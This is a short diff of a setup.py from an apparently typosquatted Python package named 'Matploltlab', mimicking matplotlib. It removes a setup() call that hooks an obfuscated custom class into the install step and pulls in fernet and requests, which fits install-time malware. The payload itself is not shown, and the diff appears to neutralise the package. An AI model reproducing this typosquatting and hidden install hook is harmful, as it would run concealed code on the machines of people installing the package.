@@ -18,22 +18,5 @@ class KqNETECEPgvFlbcuiwHTzagCqQorxySDEblbUhHJyQXLSRTyHMiCXWTcheAKGlVxNhDo(insta
             install.run(self)
 
 
-setup(
-    name="Matploltlab",
-    version=VERSION,
-    author="nwIoXBTENjX",
-    author_email="ujYWgFpIFYhEPVdrH@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': KqNETECEPgvFlbcuiwHTzagCqQorxySDEblbUhHJyQXLSRTyHMiCXWTcheAKGlVxNhDo,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
